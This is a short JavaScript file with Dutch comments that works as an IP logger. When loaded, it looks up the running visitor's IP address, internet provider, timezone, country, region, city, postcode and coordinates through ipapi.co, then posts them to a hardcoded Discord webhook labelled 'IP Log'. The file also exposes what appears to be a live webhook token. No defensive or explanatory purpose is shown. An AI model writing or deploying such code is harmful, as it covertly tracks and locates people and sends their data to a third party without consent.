// Vervang WEBHOOKURL door je eigen Discord Webhook URL
const webHookUrl = "https://discord.com/api/webhooks/1310562977971175425/DILmHb8nxmmVV0f1vfR4D2yoOcMZL-D1RevuOOSaJVndxL2InKUcQpZSFUCwGRjuwEEY";

/*
    Gebruik van ipapi.co voor IP-geolocatiegegevens.
    Geen API-token nodig.
    API-documentatie: https://ipapi.co/
*/

const sendToWebhook = async () => {
    try {
        // Haal gegevens op van de ipapi.co API
        const response = await fetch('https://ipapi.co/json/');
        if (!response.ok) throw new Error("ipapi.co request failed");
        
        const data = await response.json();

        // Variabelen instellen
        const ip = data.ip;
        const provider = data.org || "Onbekend";
        const timezone = data.timezone || "Onbekend";
        const country = data.country_name || "Onbekend";
        const region = data.region || "Onbekend";
        const city = data.city || "Onbekend";
        const zip = data.postal || "Onbekend";
        const lat = data.latitude || "Onbekend";
        const lon = data.longitude || "Onbekend";

        // Payload voor de webhook
        const params = {
            username: "IP Log",
            avatar_url: "",
            content: `
__**🌐 IP-Address:**__ 
\`${ip}\`

__**📞 Provider:**__ 
${provider}

__**🗺️ Timezone:**__ 
${timezone}

__**🌍 Country and Region:**__ 
${country} - ${region}

__**🏙️ Zip Code & City:**__ 
${zip} ${city}

__**📍 Location:**__ 
**Longitude:** ${lon}
**Latitude:** ${lat}
            `
        };

        // Verstuur gegevens naar de Discord webhook
        const webhookResponse = await fetch(webHookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(params),
        });

        if (!webhookResponse.ok) throw new Error("Webhook request failed");
        console.log("Gegevens succesvol verzonden naar Discord Webhook.");
    } catch (error) {
        console.error("Fout opgetreden:", error.message);
    }
};

// Voer de functie uit
sendToWebhook();
